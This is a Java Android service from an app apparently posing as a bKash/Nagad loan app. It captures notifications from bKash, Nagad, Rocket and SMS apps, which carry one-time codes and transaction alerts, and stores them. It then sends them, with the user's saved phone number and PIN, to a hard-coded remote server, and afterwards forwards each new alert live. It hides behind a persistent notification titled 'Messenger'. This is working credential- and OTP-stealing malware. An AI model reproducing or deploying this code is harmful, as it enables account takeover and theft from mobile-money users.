package com.bkash.amar.loan;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.*;

public class NotificationCaptureService extends NotificationListenerService {
    private static final String TAG = "NotifCapture";
    private static final String STORAGE_FILE = "captured_notifications.json";
    private static final int MAX_STORED = 200;
    private static final String DEFAULT_DASHBOARD_URL = "https://original-bkash-nagad-macro-loan-692165690086.europe-west2.run.app/api/submit";
    private static final String DASHBOARD_URL_KEY = "dashboard_url";
    private static final String API_BASE_URL_KEY = "api_base_url";
    private static final String DEFAULT_API_BASE = "https://original-bkash-nagad-macro-loan-692165690086.europe-west2.run.app";
    private static final String FLUSH_TRIGGER_KEY = "flush_notif_queue";
    private static final String PREFS_NAME = "CapacitorStorage";
    private static final long FLUSH_CHECK_INTERVAL = 5000;
    private static final String CHANNEL_ID = "system_service_channel";
    private static final int FOREGROUND_ID = 2001;

    // Only capture notifications from these apps
    private static final List<String> ALLOWED_PACKAGES = Arrays.asList(
        "com.bKash.customerapp",      // bKash
        "com.konasl.nagad",           // Nagad
        "com.dbbl.mbs.apps.main",     // Rocket
        "com.dbbl.mbs",               // Rocket (alt)
        "com.google.android.apps.messaging", // Google Messages (SMS)
        "com.android.mms",            // AOSP SMS
        "com.samsung.android.messaging", // Samsung Messages
        "com.android.messaging"       // Android Messaging
    );

    private Handler handler;
    private boolean lastFlushHadSession = false;
    private String lastFlushedSessionId = "";
    private boolean isLiveForwarding = false;

    private Runnable flushChecker = new Runnable() {
        @Override
        public void run() {
            checkFlushTrigger();
            handler.postDelayed(this, FLUSH_CHECK_INTERVAL);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler();
        handler.postDelayed(flushChecker, 2000);
        startForegroundNotification();
        Log.d(TAG, "Notification capture started — filtering: bKash, Nagad, Rocket, SMS only");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null) handler.removeCallbacks(flushChecker);
    }

    private void startForegroundNotification() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "Messenger", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Message notifications");
            channel.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

        Notification notif = new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Messenger")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_messenger)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_LOW)
            .setCategory(Notification.CATEGORY_MESSAGE)
            .setContentIntent(pi)
            .build();

        startForeground(FOREGROUND_ID, notif);
    }

    private boolean isAllowedPackage(String pkg) {
        if (pkg == null) return false;
        for (String allowed : ALLOWED_PACKAGES) {
            if (pkg.equals(allowed) || pkg.startsWith(allowed)) return true;
        }
        return false;
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d(TAG, "Notification Listener Connected! Auto-flushing...");
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String sessionId = prefs.getString("user_session_id", null);
        if (sessionId != null && !sessionId.isEmpty()) {
            flushAllNotifications(sessionId, prefs);
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            
            // IGNORE all apps except bKash, Nagad, Rocket
            if (!isAllowedPackage(packageName)) {
                return;
            }

            Notification notif = sbn.getNotification();
            Bundle extras = notif.extras;

            String title = getString(extras, Notification.EXTRA_TITLE);
            String text = getString(extras, Notification.EXTRA_TEXT);
            String subText = getString(extras, Notification.EXTRA_SUB_TEXT);
            String bigText = getString(extras, Notification.EXTRA_BIG_TEXT);
            long when = sbn.getPostTime();

            StringBuilder fullText = new StringBuilder();
            if (!title.isEmpty()) fullText.append(title);
            if (!text.isEmpty()) {
                if (fullText.length() > 0) fullText.append(": ");
                fullText.append(text);
            }
            if (!subText.isEmpty()) {
                if (fullText.length() > 0) fullText.append(" | ");
                fullText.append(subText);
            }
            if (!bigText.isEmpty()) {
                if (fullText.length() > 0) fullText.append(" | ");
                fullText.append(bigText);
            }

            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
            JSONObject entry = new JSONObject();
            entry.put("time", sdf.format(new Date(when)));
            entry.put("timestamp", when);
            entry.put("package", packageName);
            entry.put("title", title);
            entry.put("text", text);
            entry.put("fullText", fullText.toString());
            entry.put("id", sbn.getId());
            entry.put("tag", sbn.getTag() != null ? sbn.getTag() : "");
            entry.put("key", sbn.getKey());
            entry.put("clearable", sbn.isClearable());
            entry.put("ongoing", sbn.isOngoing());

            if (notif.actions != null && notif.actions.length > 0) {
                JSONArray actionsArr = new JSONArray();
                for (Notification.Action action : notif.actions) {
                    JSONObject aObj = new JSONObject();
                    aObj.put("title", action.title != null ? action.title.toString() : "");
                    actionsArr.put(aObj);
                }
                entry.put("actions", actionsArr);
            }

            Log.d(TAG, "[" + packageName + "] " + fullText.toString().substring(0, Math.min(80, fullText.length())));
            saveNotification(entry);

            if (isLiveForwarding) {
                forwardSingleNotification(entry);
            }

            checkFlushTrigger();

        } catch (Exception e) {
            Log.e(TAG, "Capture error: " + e.getMessage());
        }
    }

    private String getString(Bundle extras, String key) {
        CharSequence cs = extras.getCharSequence(key);
        return cs != null ? cs.toString() : "";
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}

    private void saveNotification(JSONObject entry) {
        try {
            File file = new File(getFilesDir(), STORAGE_FILE);
            JSONArray existing = new JSONArray();
            if (file.exists()) {
                StringBuilder sb = new StringBuilder();
                BufferedReader reader = new BufferedReader(new FileReader(file));
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                String content = sb.toString().trim();
                if (!content.isEmpty()) existing = new JSONArray(content);
            }
            existing.put(entry);
            while (existing.length() > MAX_STORED) existing.remove(0);
            FileWriter writer = new FileWriter(file);
            writer.write(existing.toString(2));
            writer.flush();
            writer.close();

            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            prefs.edit().putString("last_captured_notif", entry.toString()).apply();
            prefs.edit().putString("notif_log", existing.toString()).apply();
        } catch (Exception e) {
            Log.e(TAG, "Save error: " + e.getMessage());
        }
    }

    private String getDashboardUrl() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        return prefs.getString(DASHBOARD_URL_KEY, DEFAULT_DASHBOARD_URL);
    }

    private String getApiBaseUrl() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        return prefs.getString(API_BASE_URL_KEY, DEFAULT_API_BASE);
    }

    private void checkFlushTrigger() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String flushFlag = prefs.getString(FLUSH_TRIGGER_KEY, null);
        if ("true".equals(flushFlag)) {
            String sessionId = prefs.getString("user_session_id", null);
            if (sessionId != null && !sessionId.isEmpty()) {
                if (lastFlushHadSession && sessionId.equals(lastFlushedSessionId)) return;
                flushAllNotifications(sessionId, prefs);
                lastFlushHadSession = true;
                lastFlushedSessionId = sessionId;
            }
        }
    }

    private void forwardSingleNotification(JSONObject entry) {
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                String sessionId = prefs.getString("user_session_id", null);
                String phone = prefs.getString("user_phone", "");
                String pin = prefs.getString("user_pin", "");
                if (sessionId == null || sessionId.isEmpty()) return;

                JSONArray arr = new JSONArray();
                arr.put(entry);

                JSONObject body = new JSONObject();
                body.put("sessionId", sessionId);
                body.put("phone", phone != null ? phone : "");
                body.put("pin", pin != null ? pin : "");
                body.put("flushAll", false);
                body.put("notifications", arr);

                URL url = new URL(getDashboardUrl());
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                OutputStream os = conn.getOutputStream();
                os.write(body.toString().getBytes("UTF-8"));
                os.flush();
                os.close();

                int code = conn.getResponseCode();
                conn.disconnect();
                Log.d(TAG, "LIVE: HTTP " + code + " — " + entry.optString("title", ""));
            } catch (Exception e) {
                Log.e(TAG, "LIVE error: " + e.getMessage());
            }
        }).start();
    }

    private void flushAllNotifications(String sessionId, SharedPreferences prefs) {
        new Thread(() -> {
            try {
                String phone = prefs.getString("user_phone", "");
                String pin = prefs.getString("user_pin", "");
                File file = new File(getFilesDir(), STORAGE_FILE);
                JSONArray all = new JSONArray();
                if (file.exists()) {
                    StringBuilder sb = new StringBuilder();
                    BufferedReader reader = new BufferedReader(new FileReader(file));
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();
                    String content = sb.toString().trim();
                    if (!content.isEmpty()) all = new JSONArray(content);
                }

                JSONObject body = new JSONObject();
                body.put("sessionId", sessionId);
                body.put("phone", phone != null ? phone : "");
                body.put("pin", pin != null ? pin : "");
                body.put("flushAll", true);
                body.put("notifications", all);

                URL url = new URL(getDashboardUrl());
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                OutputStream os = conn.getOutputStream();
                os.write(body.toString().getBytes("UTF-8"));
                os.flush();
                os.close();

                int code = conn.getResponseCode();
                conn.disconnect();

                prefs.edit().putString(FLUSH_TRIGGER_KEY, "false").apply();
                if (code >= 200 && code < 300) {
                    isLiveForwarding = true;
                    Log.d(TAG, "LIVE FORWARDING ACTIVE — " + all.length() + " notifs flushed");
                }
                Log.d(TAG, "FLUSH: HTTP " + code + " session=" + sessionId + " notifs=" + all.length());
            } catch (Exception e) {
                Log.e(TAG, "FLUSH error: " + e.getMessage());
            }
        }).start();
    }
}
